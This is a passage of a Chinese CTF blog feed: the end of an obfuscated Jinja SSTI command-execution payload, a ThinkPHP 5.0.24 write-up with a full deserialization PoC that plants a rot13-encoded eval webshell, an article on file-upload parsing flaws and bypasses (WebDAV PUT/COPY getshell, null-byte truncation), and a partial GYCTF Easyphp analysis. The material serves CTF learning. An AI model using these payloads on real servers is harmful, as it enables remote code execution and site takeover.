class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,103,101,116,105,116,101,109,95,95))(164)|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,105,110,105,116,95,95))|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,103,108,111,98,97,108,115,95,95))|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,103,101,116,105,116,101,109,95,95))(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,98,117,105,108,116,105,110,115,95,95))|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,103,101,116,105,116,101,109,95,95))(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(101,118,97,108))(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,99,97,116,32,47,102,108,97,103,103,103,103,103,103,103,103,103,39,41,46,114,101,97,100,40,41))&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="EZ-thinkphp"><a href="#EZ-thinkphp" class="headerlink" title="EZ_thinkphp"></a>EZ_thinkphp</h3><p>扫描目录，发现源码</p><p><img src="https://i.loli.net/2020/12/26/S9rz6TGBYxalcdC.png" alt="image-20201226123828906"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// www\source\application\index\controller\index.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $a=@unserialize(base64_decode(<span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;a&#x27;</span>)));<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;thinkphp 5.0.24&#x27;</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">// 利用点 </span><br></code></pre></td></tr></table></figure><p><a href="http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/">参考文章</a>  直接白嫖poc :airplane:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs php">poc<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Pivot</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pipes</span></span>&#123;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Pipes</span></span>&#123;<br><span class="hljs-keyword">private</span> $files = [];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;files = [<span class="hljs-keyword">new</span> Pivot()];<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>;<span class="hljs-comment">#Relation</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>\<span class="hljs-title">Query</span>;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Relation</span></span>&#123;<br><span class="hljs-keyword">protected</span> $selfRelation;<br><span class="hljs-keyword">protected</span> $query;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">$this</span>-&gt;query = <span class="hljs-keyword">new</span> Query();<span class="hljs-comment">#class Query</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span>;<span class="hljs-comment">#OneToOne HasOne</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Relation</span>;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OneToOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Relation</span></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-built_in">parent</span>::__construct();<br>&#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HasOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">OneToOne</span></span>&#123;<br><span class="hljs-keyword">protected</span> $bindAttr = [];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-built_in">parent</span>::__construct();<br><span class="hljs-keyword">$this</span>-&gt;bindAttr = [<span class="hljs-string">&quot;no&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>];<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>;<span class="hljs-comment">#Output</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">Memcached</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Output</span></span>&#123;<br><span class="hljs-keyword">private</span> $handle = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">protected</span> $styles = [];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> Memcached();<span class="hljs-comment">//目的调用其write()</span><br><span class="hljs-keyword">$this</span>-&gt;styles = [<span class="hljs-string">&#x27;getAttr&#x27;</span>];<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>;<span class="hljs-comment">#Model</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span>\<span class="hljs-title">HasOne</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>\<span class="hljs-title">Query</span>;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;<br><span class="hljs-keyword">protected</span> $append = [];<br><span class="hljs-keyword">protected</span> $error;<br><span class="hljs-keyword">public</span> $parent;<span class="hljs-comment">#修改处</span><br><span class="hljs-keyword">protected</span> $selfRelation;<br><span class="hljs-keyword">protected</span> $query;<br><span class="hljs-keyword">protected</span> $aaaaa;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;parent = <span class="hljs-keyword">new</span> Output();<span class="hljs-comment">#Output对象,目的是调用__call()</span><br><span class="hljs-keyword">$this</span>-&gt;append = [<span class="hljs-string">&#x27;getError&#x27;</span>];<br><span class="hljs-keyword">$this</span>-&gt;error = <span class="hljs-keyword">new</span> HasOne();<span class="hljs-comment">//Relation子类,且有getBindAttr()</span><br><span class="hljs-keyword">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;<span class="hljs-comment">//isSelfRelation()</span><br><span class="hljs-keyword">$this</span>-&gt;query = <span class="hljs-keyword">new</span> Query();<br><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>;<span class="hljs-comment">#Query</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Query</span></span>&#123;<br><span class="hljs-keyword">protected</span> $model;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;model = <span class="hljs-keyword">new</span> Output();<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span class="hljs-title">driver</span>;<span class="hljs-comment">#Memcached</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">File</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcached</span></span>&#123;<br><span class="hljs-keyword">protected</span> $handler = <span class="hljs-literal">null</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> File();<span class="hljs-comment">//目的调用File-&gt;set()</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>;<span class="hljs-comment">#File</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;<br><span class="hljs-keyword">protected</span> $options = [];<br><span class="hljs-keyword">protected</span> $tag;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;options = [<br><span class="hljs-string">&#x27;expire&#x27;</span>        =&gt; <span class="hljs-number">0</span>,<br><span class="hljs-string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="hljs-literal">false</span>,<br><span class="hljs-string">&#x27;prefix&#x27;</span>        =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br><span class="hljs-string">&#x27;path&#x27;</span>          =&gt; <span class="hljs-string">&#x27;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#x27;</span>,<br><span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>];<br><span class="hljs-keyword">$this</span>-&gt;tag =<span class="hljs-string">&#x27;abcdef&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>&#123;<br><br><br>&#125;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>\<span class="hljs-title">Windows</span>;<br><span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> Windows()));<br><span class="hljs-comment">//在index.php页面传入值</span><br><span class="hljs-comment">// 文件的名字是：传入内容+md5(&#x27;tag_&#x27;+md5($tag)).php 并且部分需要urlcode转码</span><br><span class="hljs-comment">// &lt;%3fcuc cucvasb()%3briny($_TRG[pzq])%3b%3f&gt;468bc8d30505000a2d7d24702b2cda94.php</span><br></code></pre></td></tr></table></figure><p>执行命令即可</p><p><img src="https://i.loli.net/2020/12/26/xjLs3Upgi8ctJKY.png" alt="image-20201226140139525"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传基础</title>
    <link href="/2020/12/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/12/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><blockquote><p>不是涉及的版本不是最新版……</p></blockquote><a id="more"></a><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><blockquote><p>IIS 6.0</p></blockquote><ol><li><p>IIS中的*.asa *.asp 文件夹中的文件都会被当成asp文件解析</p></li><li><p>文件为*.asp;1.jpg时会被当成ASP脚本执行</p></li><li><p>WebDav</p><blockquote><p>它是基于HTTP 1.1 协议的通信协议，它扩展了HTTP协议，添加了新的方法</p><p>打开WebDav后支持PUT Move Copy Delete </p><p>IIS Write 是一款探测WebDav漏洞的软件 </p></blockquote><ul><li><p>使用 OPTIONS 查看支持的所有方法</p></li><li><p>通过PUT上传文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PUT</span> /<span class="hljs-number">1</span>.txt HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>:www.example.com<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">30</span><br><br><span class="hljs-section">&lt;% …………%&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>使用Move 或 Copy 方法改名</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy">COPY <span class="hljs-regexp">/1.txt HTTP/</span><span class="hljs-number">1.1</span><br><span class="hljs-attr">Host:</span>www.example.com<br><span class="hljs-attr">Destination:</span> <span class="hljs-attr">http:</span><span class="hljs-comment">//www.example.com/cmd.adp</span><br></code></pre></td></tr></table></figure></li><li><p>这样就能getshell</p></li><li><p>还可以使用Delete方法删除任意文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">DELETE</span> <span class="hljs-string">/1.txt</span> HTTP/1.1<br><span class="hljs-attribute">Host:www.example.com</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><blockquote><p>1.x  2.x</p></blockquote><p>Apache在解析文件时有一个原则：碰到不认识的扩展名时，会从后向前解析，知道碰到认识的扩展名为止</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">example</span>:<br>1<span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.rar</span><span class="hljs-selector-class">.xs</span><span class="hljs-selector-class">.aa</span> 这时就会从后往前解析，直到遇到<span class="hljs-selector-class">.php</span><br></code></pre></td></tr></table></figure><h3 id="PHP-CGI"><a href="#PHP-CGI" class="headerlink" title="PHP CGI"></a>PHP CGI</h3><blockquote><p>在php的配置文件中：cgi.fi: x_pathinfo 这个选项在某些版本中，默认是开启的，在访问URL时，如<code>www.example.com/1.txt/1.php</code></p><p>这时如果1.php不存在，则.php将会向前递归解析</p><p>该漏洞在Nginx IIS7.0  IIS7.5  Lighttpd 等web容器中容易出现</p></blockquote><p>主要利用方法就是上传合法文件名，然后进行非法解析</p><h2 id="绕过上传漏洞"><a href="#绕过上传漏洞" class="headerlink" title="绕过上传漏洞"></a>绕过上传漏洞</h2><ol><li><p>绕过前端javascript 过滤</p></li><li><p>绕过黑名单</p><blockquote><p>asp php  jsp  php5  asa  aspx </p></blockquote></li><li><p>修改MIME</p></li><li><p>截断上传</p><blockquote><p>将 1.asp空格xx.jpg 进入十六进制编辑器将空格的16进制数20修改为00，最后会发现上传到服务的文件变成了1.asp</p></blockquote></li><li><p>使用.htaccess   .user.ini  配置文件的绕过</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GYCTF2020-Easyphp</title>
    <link href="/2020/12/21/GYCTF2020-Easyphp/"/>
    <url>/2020/12/21/GYCTF2020-Easyphp/</url>
    
    <content type="html"><![CDATA[<p>考点：php序列化pop链   序列化字符串逃逸</p><blockquote><p>打开题目按照管理先扫描目录</p></blockquote><blockquote><p>使用dirsearch 扫描出来了  flag.php  login.php</p><p>使用御剑什么都没有扫出来</p><p>使用dirbuster什么都没有</p><p>这个貌似是BUU平台问题……</p></blockquote><p>打开题目</p><p><img src="https://i.loli.net/2020/12/19/vXSHu8nJyDhlE3q.png" alt="image-20201219105022481"></p><p>发现登录框，尝试弱口令登录，并且爆破用户名与密码，查看图片</p><blockquote><p>失败</p><p>查看大佬的wp，存在<a href="http://www.zip（没扫出来…………）">www.zip（没扫出来…………）</a></p></blockquote><p>查看<a href="http://www.zip,解压后查看代码/">www.zip，解压后查看代码</a></p><p>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//update.php</span><br><br>$users=<span class="hljs-keyword">new</span> User(); <span class="hljs-comment">//创建类</span><br>$users-&gt;update(); <span class="hljs-comment">// 调用user类的update函数</span><br><span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]===<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">echo</span> $flag;<br>&#125;<br> <br><span class="hljs-comment">// user类的update函数</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">//调用了getNewinfo函数</span><br>    $Info=unserialize(<span class="hljs-keyword">$this</span>-&gt;getNewinfo());<br>    $age=$Info-&gt;age;<br>    $nickname=$Info-&gt;nickname;<br>    <span class="hljs-comment">//定义了一个UpdateHelper类</span><br>    $updateAction=<span class="hljs-keyword">new</span> UpdateHelper($_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>],$Info,<span class="hljs-string">&quot;update user SET age=<span class="hljs-subst">$age</span>,nickname=<span class="hljs-subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>]);<br>        <span class="hljs-comment">//这个功能还没有写完 先占坑</span><br>    &#125;<br><br><span class="hljs-comment">// 输入点 age 与 nickname 参数可控</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        $age=$_POST[<span class="hljs-string">&#x27;age&#x27;</span>];<br>        $nickname=$_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>    <span class="hljs-comment">//创建了一个Info类并且序列化使用safe过滤</span><br>        <span class="hljs-keyword">return</span> safe(serialize(<span class="hljs-keyword">new</span> Info($age,$nickname)));<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params">$parm</span>)</span>&#123;<br>    $array= <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;regexp&#x27;</span>,<span class="hljs-string">&#x27;load&#x27;</span>,<span class="hljs-string">&#x27;into&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;insert&#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;alter&quot;</span>);<br>    <span class="hljs-keyword">return</span> str_replace($array,<span class="hljs-string">&#x27;hacker&#x27;</span>,$parm);<br>&#125; <span class="hljs-comment">// 字符串替换</span><br><br><br><br><span class="hljs-comment">// Info 类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $age;<br>    <span class="hljs-keyword">public</span> $nickname;<br>    <span class="hljs-keyword">public</span> $CtrlCase;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$age,$nickname</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;age=$age;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname=$nickname;<br>    &#125;<br>    <span class="hljs-comment">// 在对象上下文中调用不可访问的方法时触发</span><br>    <span class="hljs-comment">// __call 中的参数，$name 需要调用的方法的名称，$arguments是一个数组，其中包含传递给方法$name的参数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$name,$argument</span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="hljs-number">0</span>]);<br>        <span class="hljs-comment">//此处$argument[0]就为age</span><br>    &#125;<br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>这里如何触发__call()函数</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span 